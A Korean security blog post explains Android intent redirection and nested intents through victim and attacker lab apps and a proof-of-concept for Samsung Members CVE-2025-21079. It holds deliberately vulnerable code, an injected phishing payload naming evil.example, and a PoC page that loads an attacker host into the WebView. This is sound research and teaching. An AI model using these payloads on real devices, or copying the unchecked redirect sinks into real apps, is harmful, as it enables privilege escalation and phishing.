[이상동몽] 루팅을 못한 자의 무기: Intent Redirection Part 1. (KR)

안녕하세요! Hackyboiz에서 가장 낮은 곳(low-level)을 맡고 있고, 이제는 더 높은 곳을 바라보는 newp1ayer48 입니다! 🤸🏻‍♂️

이상동몽 프로젝트로 Android를 보고 있고, 그중에서 삼성 갤럭시에서 애플리케이션 단을 위주로 보고 있습니다. 여기에는 슬픈 사연이 있는데, 삼성 갤럭시의 경우 One UI 8.5(Android 16) 버전부터 기본적으로 루팅이 막혀있습니다. 이로 인해 루팅을 하려면 또 다른 0-day가 필요하기 때문에… “오히려 좋아”를 외치면서 logcal bug를 위주로 보고 있습니다.

이번 글에서 주로 다룰 이야기는 Android의 특징적인 취약점임과 동시에 자주 사용하는 Logical Bug 취약점인 intent redirection입니다. 이것을 통해 Memory Courrption과 Command injection 없이, system과 같은 상위 권한의 Shell까지 접근이 가능합니다!

1. Intent

Intent는 지난 Part 0. 연구 글에서도 소개 했지만, 중요한 개념이니 다시 짚고 넘어가겠습니다. 특히, 초기에 Android를 개발하고 설계를 했을 때, 왜 Intent 형태를 사용했는지 살펴보겠습니다.

안드로이드는 “누구나 앱을 올리고 누구나 설치한다”라는 철학에 입각해서 설계된 운영체제입니다. 따라서, 기존의 C/C++ 같은 Memory에 직접 접근할 수 있는 Unmanaged 언어로 프로그램을 개발한다는 것이 퍼포먼스/보안적으로 큰 리스크였을 것입니다. 이와 더불어 아래 4가지 제약과 조건을 만족 시키는 형태로 안드로이드 애플리케이션 모델을 설계했어야 합니다.

  1. 속도: 시스템이 앱의 어떤 부분이든 필요할 때 프로세스를 띄우고 , 여러 진입점으로 실행 가능해야 한다.
  2. 생명 주기: 프로세스가 언제든 죽으며, 수신자가 없을 수 있다.
  3. 이름 해석: 시스템이 3rd party 앱처럼 이름으로 지목할 수 없거나 모르는 경우도 존재한다.
  4. 보안: 각 앱들은 UID로 격리돼 있어야 한다.

따라서, 단순히 원격 메서드 호출로는 이를 충족시킬 수 없습니다.

https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2

이 문제를 해결하기 위해 Binder IPC를 채택했습니다. 이는 Linux Kernel에서 이미 존재하는 방식입니다. Kernel에 존재하는 Binder가 서로 다른 프로세스 간의 통신을 IPC 메시지 형태로 전달하게 됩니다. 이를 통해 프로세스(앱) 간의 격리를 달성할 수 있습니다.

이런 구현은 iOS나 macOS에서도 xpc 형태의 유사한 구조를 볼 수 있습니다.

https://developer.android.com/guide/platform?hl=ko

따라서 안드로이드에서 앱 간 통신에 사용되는 메시지는, 시스템이 읽고 해석하고 저장하고 위임할 수 있도록 서술된 데이터의 형태를 가져야 합니다. 이 때문에 Binder IPC에 더해서, 이전에 언급했던 제약과 조건을 달성하기 위해 Java 단의 Intent가 도입됩니다.

안드로이드 아키텍처는 위 사진처럼 확인할 수 있고, 크게 Java framework로 동작하는 Java Level과 Native Library/Linux Kernel로 돌아가는 C Level로 구분한다고 할 수 있습니다. 해당 아키텍처 그림에서 Intent는 Java Level, Binder IPC는 C Level에 들어간다고 볼 수 있습니다.

이전에 있던 안드로이드 아키텍처 그림과 매핑하여, 앱 A에서 앱 B로 Intent 메시지를 보내는 과정을 도식으로 나타내면 위와 같습니다. 앱 A의 java framework 단에서 생성된 intent 객체는 native 라이브러리에서 parcel 메시지를 생성합니다. 그것은 binder가 IPC 형태로 전달하고, 중간에 System 권한(UID 1000)의 system_server가 권한 검사를 합니다. 이를 통과하면 앱 B로 마저 전달이 이루어지고, parcel 메시지에서 Intent를 읽고 앱 B에서 확인하는 구조로 이루어집니다.

2. Intent Redirection

Intent를 우리 눈으로 직접 확인하기 좋은 예시는 바로 알림(Notification)입니다. 알림 표시 및 트리거 하는 주체는 SystemUI(시스템 UI 프로세스)지만, 알림을 탭해서 send가 되면 실제 Intent는 알림을 만든 원본 앱의 신원과 권한으로 실행됩니다. 예를 들어 캘린더 알림의 액션 버튼이나 메시지 알림 본문을 탭하면, SystemUI가 아니라 캘린더/메시지 앱의 권한으로 해당 Intent가 발사됩니다. Intent Redirection의 기본 아이디어는 바로 여기서 출발합니다.

정상적인 경우, 앱 A는 앱 B의 exported 컴포넌트만 실행할 수 있습니다. android:exported="false"인 컴포넌트는 같은 앱(같은 UID)만 실행할 수 있습니다. Intent Redirection은 이런 접근 제어를 해당 앱의 권한으로 실행되는 대리 실행 형태로 우회합니다. 이 때문에, Intent Redirection은 Confused Deputy에 해당되는 Logcal Bug 취약점으로 분류됩니다.

공격자는 비공개 컴포넌트를 직접 호출하지 않습니다. 대신 피해 앱의 exported 컴포넌트에 데이터를 보내고, 피해 앱이 그 데이터로 만든 Intent를 startActivity() 등으로 대신 보내게 만듭니다. 시스템이 보기에 호출자는 공격자가 아니라 피해 앱 입니다.

지점 발사 API 공격자가 노리는 것
Activity startActivity(), startActivityForResult() 비공개 Activity 실행, 결과 데이터 탈취
Broadcast Receiver sendBroadcast(), sendOrderedBroadcast() 비공개 Receiver에 조작된 브로드캐스트 전달, 보호된 액션 위조
Content Provider Intent data URI(content://) + FLAG_GRANT_READ/WRITE_URI_PERMISSION 비공개 provider 접근 권한을 공격자 컴포넌트에 위임 → 파일·DB 탈취
PendingIntent PendingIntent.send() (알림 포함) 원본 앱 권한으로 보관된 Intent를 대신 발사

Intent redirection은 결국 공격자에게 영향을 받은 Intent를 피해 앱이 본인의 권한으로 어딘가에 발사하는 것입니다. 이 발사가 일어나는 sink는 안드로이드 컴포넌트 구조상 크게 네 가지입니다.

  • Activity: 사용자가 보고 조작하는 하나의 화면입니다. 예를 들어 메시지 앱에서 대화 목록 화면, 대화 내용 화면, 메시지 작성 화면이 각각 Activity입니다. 앱을 실행하거나 다른 화면으로 넘어가는 건 Activity를 시작하는(startActivity) 일입니다.
  • Broadcast Receiver: 시스템이나 다른 앱이 뿌리는 이벤트(broadcast)를 듣고 반응하는 컴포넌트입니다. 예를 들어 “부팅 완료”, “배터리 부족”, “비행기 모드 켜짐” 같은 이벤트가 오면 앱이 깨어나 처리합니다. 알람 앱이 부팅 후 알람을 다시 등록하거나, 메신저가 네트워크 연결 복구 시 동기화를 시작하는 식입니다.
  • Content Provider: 구조화된 데이터(주로 DB·파일)를 content:// URI로 다른 앱에 제공하는 컴포넌트입니다. 대표적으로 연락처(Contacts Provider)가 있어서, 메신저가 “연락처 접근 권한”으로 사용자 주소록을 읽어옵니다.
  • PendingIntent: “지금 당장 실행할 Intent”가 아니라, 나중에 다른 프로세스가 내 앱 대신 발사하도록 맡겨두는 Intent 토큰입니다. 아까 예시로 설명한 알림(Notification)이 바로 이것입니다.

2.1. 실습

Intent Redirection을 직접 예제 코드와 앱을 통해서 직접 실습을 통해 확인을 해보겠습니다.

<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <application
        android:allowBackup="true"
        android:label="@string/app_name">

        <!-- Launcher: run victim normally to see the legitimate screen -->
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Entry point reachable by the attacker (the redirection proxy) -->
        <activity android:name=".RedirectActivity" android:exported="true">
            <intent-filter>
                <action android:name="com.example.victim.REDIRECT" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>

        <!-- Should be reachable only by victim itself -->
        <activity android:name=".SecretActivity" android:exported="false" />
    </application>
</manifest>

victim.apk에 사용되는 AndroidManifest.xml입니다. AndroidManifest.xml는 앱과 컴포넌트들의 접근 제어와 권한을 명시한 파일입니다. 여기서 우리가 봐야할 것은 SecretActivity가 exported="false"로 설정되어 있다는 것입니다. 이렇게 되어 있으면 해당 앱의 UID를 가진 앱만이 접근이 가능합니다.

package com.example.victim;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import java.net.URISyntaxException;

public class RedirectActivity extends Activity {
    private static final String TAG = "victim";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String uri = getIntent().getStringExtra("redirect_uri");
        Log.i(TAG, "redirect_uri = " + uri);

        if (uri != null) {
            try {
                Intent forward = Intent.parseUri(uri, Intent.URI_INTENT_SCHEME);
                startActivity(forward);   // vuln
            } catch (URISyntaxException e) {
                Log.e(TAG, "bad redirect_uri", e);
                Toast.makeText(this, "Invalid payload: " + e.getMessage(), Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                Log.e(TAG, "startActivity failed", e);
                Toast.makeText(this, "Launch failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        }
        finish();
    }
}

이 소스 코드는 취약점이 존재하는 부분입니다. startActivity(forward);로 검증 없이 intent를 발사하는 구문이 존재하므로 Intent Redirection이 발생합니다.

package com.example.victim;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;

public class SecretActivity extends Activity {

    private static final String NOTICE =
            "[Notice] System maintenance is scheduled today at 18:00.";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String extra = getIntent().getStringExtra("append");

        String shown = NOTICE;
        if (extra != null) {
            shown = NOTICE + "\n" + extra;
        }

        TextView tv = new TextView(this);
        int pad = (int) (16 * getResources().getDisplayMetrics().density);
        tv.setPadding(pad, pad, pad, pad);
        tv.setTextIsSelectable(true);
        tv.setText("SecretActivity (exported=false)\n\n" + shown);
        setContentView(tv);
    }
}

이 부분은 이전에 AndroidManifest.xml에서 보았던, 제한된 내부 액티비티입니다. 기존 의도 대로라면, 하드코딩 된 문자열만을 화면에 출력합니다. 그러나 앱 권한으로 intent를 받는데, 이 역시 호출자 검증이 없기 때문에 Intent Redirction이 발생하면 입력 값도 추가로 출력이 되는 구조입니다.

다음은 attacker.apk의 소스코드입니다.

package com.example.attacker;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final String VICTIM_PKG = "com.example.victim";
    private static final String REDIRECT_ACTIVITY = "com.example.victim.RedirectActivity";
    private static final String SECRET_ACTIVITY = "com.example.victim.SecretActivity";

    private static final String SAMPLE_PAYLOAD =
            "intent:#Intent;component=com.example.victim/.SecretActivity;"
            + "S.append=* Re-authenticate at http://evil.example for security;end";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final EditText payload = findViewById(R.id.payload);
        payload.setText(SAMPLE_PAYLOAD);

        Button send = findViewById(R.id.btn_send);
        send.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String text = payload.getText().toString();
                Intent i = new Intent("com.example.victim.REDIRECT");
                i.setClassName(VICTIM_PKG, REDIRECT_ACTIVITY);
                i.putExtra("redirect_uri", text);
                try {
                    startActivity(i);
                } catch (Exception e) {
                    Toast.makeText(MainActivity.this,
                            "Send failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
                }
            }
        });

        Button direct = findViewById(R.id.btn_direct);
        direct.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    Intent i = new Intent();
                    i.setClassName(VICTIM_PKG, SECRET_ACTIVITY);
                    startActivity(i);
                    Toast.makeText(MainActivity.this,
                            "Launched directly (unexpected)", Toast.LENGTH_LONG).show();
                } catch (SecurityException e) {
                    Toast.makeText(MainActivity.this,
                            "Direct launch denied: " + e.getMessage(), Toast.LENGTH_LONG).show();
                } catch (Exception e) {
                    Toast.makeText(MainActivity.this,
                            "Direct launch failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
                }
            }
        });
    }
}

이 소스코드는 입력 값을 전송하는 부분입니다. Intent Redirection을 트리거하기 위해, victim.apk에서 숨겨진 SECRET_ACTIVITY를 목표로 작성되었습니다. 또한, attacker.apk 권한으로 intent를 보내면 어떤 현상이 발생하는지 확인하기 위한 버튼도 추가로 제작되었습니다.

해당 attacker.apk와 victim.apk를 통해 실습을 진행한 결과입니다. victim.apk에서는 기본적으로 하드코딩 된 문자열을 출력합니다. 그리고 exported="false"가 되어있기 때문에, attacker.apk에서 직접 해당 액티비티에 접근이 안되는 것을 볼 수 있습니다.

intent:#Intent;component=com.example.victim/.SecretActivity;S.append=INJECTED;end

그러나 위와 같은 메시지를 담은 Intent 메시지를 전송하면 Intent Redirection이 되어 이를 우회할 수 있습니다. 이전 확인한 취약점인 startActivity(forward)를 호출하는 주체는 victim 프로세스(victim UID)입니다. 그래서 기본적인 UID 검증을 수행하는 system_server의 권한 검사는 호출자 UID == 대상 UID로 보고 non-exported 액티비티인 SecretActivity 실행을 허용합니다.

이를 통해 공격자가 입력한 악성 문자열이 삽입되었고, 사용자로 하여금 악성 URL로 접속을 유도할 수 있는 피싱 시나리오가 가능한 것을 확인할 수 있습니다.

3. Nested Intent

Nested Intent는 이름 뜻처럼 여러 Intent가 중첩 된 상태로 존재하는 Intent 객체를 의미합니다. 완성된 Intent 객체를 다른 Intent의 extra에 Parcelable로 넣어 보내고, 피해 앱이 이를 꺼내 그대로 실행하게 만드는 방식입니다.

앱은 화면 전환 후 다음에 열 화면을 넘겨주려고 Intent 안에 Intent를 담는 경우가 많습니다. 로그인 후 원래 화면으로 복귀, 권한 요청 후 작업 재개, 라우팅용 프록시 Activity가 대표적입니다. Intent는 Parcelable이므로 putExtra("next", innerIntent)로 그대로 담을 수 있습니다.

이 또한 실습으로, 이전에 실습을 nested intent로 바꾸면 어떻게 되는지 확인해보겠습니다.

Intent forward = Intent.parseUri(uri, Intent.URI_INTENT_SCHEME);
if (Guard.isAllowed(this, forward)) {     // patch
    Log.i(TAG, "[parseUri] allowed -> " + Guard.describe(forward));
    launch(forward, "parseUri");

victim.apk가 이전의 Intent Redirction에 대한 패치로 위처럼 문자열 대신 extra에서 Intent 객체를 꺼내 실행하도록 변경합니다.

Intent inner = new Intent();
inner.setClassName(VICTIM_PKG, SECRET_ACTIVITY);
inner.putExtra("append", INJECTED);

Intent outer = new Intent(ACTION_REDIRECT);
outer.setClassName(VICTIM_PKG, REDIRECT_ACTIVITY);
outer.putExtra("forward_intent", inner);
send(outer);

이를 우회하기 위해 attacker.apk는 nested intent 형태로 안쪽 Intent에 페이로드를 작성합니다. 그리고 바깥의 Intent extra에 정상적인 intent를 구성하여 intent를 중첩합니다.

실습을 진행하면 Intent Redirection은 패치로 인해 막히는 것을 확인할 수 있습니다. 그러나 nested intent로 된 페이로드를 전송하면 익스플로잇이 잘 되는 것을 확인할 수 있습니다. 이처럼 nested intent는 크게 두 가지를 우회할 수 있습니다.

첫번째는 앱의 입력 검증입니다. 바깥 Intent만 보면 정상인 것처럼 보이지만 공격 페이로드는 extra 안에 Parcel로 포장되어 있어, scheme/host/action 화이트리스트 검사를 바깥 Intent 기준으로 통과합니다. 피해 앱이 getParcelableExtra()로 꺼내기 전까지 내부 Intent는 그냥 불투명한 parcel 바이트 덩어리입니다.

두번째는 android:exported="false" 접근 제한입니다. 내부 Intent의 component를 피해 앱의 비공개 Activity로 지정하면, 피해 앱이 자기 UID로 startActivity()를 호출하므로 권한 검사가 통과됩니다.

Android 16은 이 패턴을 OS 차원에서 막습니다. 앱의 targetSdk와 OS가 모두 Android 16일 때, extra에서 꺼낸 Intent는 기본적으로 실행이 차단됩니다. 다만 개발자가 꺼낸 Intent에 removeLaunchSecurityProtection()을 호출하면 이 보호가 풀립니다.

4. 1-Day Case: CVE-2025-21079

Intent Redirection의 실제 사례인 CVE-2025-21079를 살펴보겠습니다. 이 취약점은 pwn2own Ireland 2025에서 시연 된 취약점입니다. Samsung Members 앱에서 이어지는 취약점으로 결과적으로 System 권한의 Activity를 실행할 수 있는 취약점입니다. 공격자 제어 URL을 Samsung Members 앱 내부 WebView에 띄우고, 그 WebView를 통해 Intent Redirection까지 연결하는 체인입니다.

4.1. Webview

String url = getIntent().getStringExtra("url");
String viewType = getIntent().getStringExtra("viewType");
boolean allowWithoutLogin =
        getIntent().getBooleanExtra("ALLOW_WITHOUT_LOGIN", false);

if (ActionUri.canPerformActionLink(getIntent())
        && (allowWithoutLogin || isLoggedIn())) { // vuln
    route(ActionUri.NEWS_AND_TIPS_DETAIL, getIntent().getExtras());
}

allowWithoutLogin이 true면 isLoggedIn()을 보지 않고 바로 라우팅하므로, 공격자가 extra에 ALLOW_WITHOUT_LOGIN=true만 넣으면 로그인 없이 내부 화면으로 진입할 수 있습니다.

if ("INAPP".equals(viewType) && url != null && url.startsWith("http")) {
    webView.getSettings().setJavaScriptEnabled(true);
    webView.setWebViewClient(new yi3());
    webView.loadUrl(url); // vuln
}

viewType이 "INAPP"이고 url이 http로 시작하는지만 확인한 뒤 loadUrl(url)을 호출합니다. 대상 호스트나 도메인을 전혀 검증하지 않으므로, 공격자가 extra url에 자신의 서버 주소를 넣으면 그 페이지가 삼성 Members의 WebView에 그대로 로드됩니다.

4.2. Intent Redirection

public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest req) {
    String url = req.getUrl().toString();
    oh6.L(activity, url);
    return true;
}

yi3.shouldOverrideUrlLoading는 WebView가 이동하려는 모든 URL을 가로채 문자열로 만든 뒤 oh6.L에 넘깁니다. 공격자 서버가 1단계에서 로드된 페이지에 302 응답으로 intent: URL을 돌려주면, 그 URL이 그대로 oh6.L에 도달합니다.

static void L(Activity activity, String str) {
    if (TextUtils.isEmpty(str)) return;
    if (!str.startsWith("intent:")) return;
    try {
        Intent uri = Intent.parseUri(str, 1);
        activity.getPackageManager().getPackageInfo(uri.getPackage(), 0);
        activity.startActivity(uri); // vuln
    } catch (Exception e) {
    }
}

전달된 Intent의 component·action·extra는 전부 공격자가 intent: URL 안에 적어 넣은 값이고, oh6.L은 출처나 대상이 안전한지 전혀 검사하지 않습니다. startActivity를 호출하는 주체가 삼성 Members이므로, 이 Intent는 삼성 Members의 권한으로 발사되어 설치된 임의의 exported 컴포넌트를 1 Click으로 실행합니다.

<h1>
    <button style="height:200px;width:200px" onclick="yaystartyay()">yaypocyay</button>

    <script type="text/javascript">

        function yaystartyay() {
            var yayhostyay = "172.16.30.113"

            // open com.samsung.android.voc
            location.href="intent://view/newsAndTipsDetail#Intent;S.viewType=INAPP;scheme=voc;B.ALLOW_WITHOUT_LOGIN=true;S.url=http%3A%2F%2F" + yayhostyay + "%3A8000%2Fyayredirect1yay;end";
        }

    </script>
    <br>
</h1>

위 코드는 악성 웹페이지에서 Intent Redirection 페이로드가 담겨있는 HTML 코드입니다. 즉, WebView에서 확인하는 intent: URL을 우회하여 앱이 parseUri로 해석해 그대로 실행합니다. 이를 통해 설치된 패키지의 exported Activity라면 무엇이든 클릭 한 번으로 실행될 수 있습니다.

Pwn2Own 2025 – Part 1: Samsung Members WebView Takeover & Intent Redirection (CVE-2025-21079) | Djini AI

PoC 과정이 담긴 GIF를 확인하면, 악성 URL에서 PoC 링크를 1 Click으로 트리거하면 Samsung Members 앱을 경유하고 최종적으로 Settings 앱을 실행하게 됩니다. Setting 앱은 UID 1000을 가지고 있는 System 권한의 앱이므로, 해당 PoC를 통해 1 Click System Activity Launch가 가능함을 확인할 수 있습니다. 해당 글에서는 이후 Samsung Account과 Bixby로 이어지는 체인으로 pwn2own 체인을 완성했다고 설명합니다.

앞서 살펴본 안드로이드의 개발 철학에서도 드러나듯, 앱 간의 격리가 되어있는 안드로이드의 특성이 있습니다. 그렇기 때문에 다른 앱에 영향을 주는 대표적인 수단이 바로 Intent이고, Lateral Movement와 같은 파급력이나 취약점과 익스플로잇 관점에서도 Intent Redirection은 안드로이드에서 사용되는 매우 중요합니다.

그리고 이 취약점을 통해 권한이 없는 앱이나 입력을 통해, system(UID 1000) 같은 상위 권한을 취득하거나 접근할 수 있습니다. 그렇기 때문에 pwn2own에서도 자주 등장하고 사용됩니다.

개인적인 생각으로 LLM으로 수많은 취약점이 발견되고 패치되는 지금, AI가 비교적 발견하기 어려운 취약점이라는 생각이 듭니다. 정적 분석으로 코드에 바로 취약점이 드러나는 Memory Corruption보다, 마치 정상처럼 보이는 타 앱 간의 통신에서 발생하는 Intent Redirection의 강점이 드러나고 있다고 생각합니다.
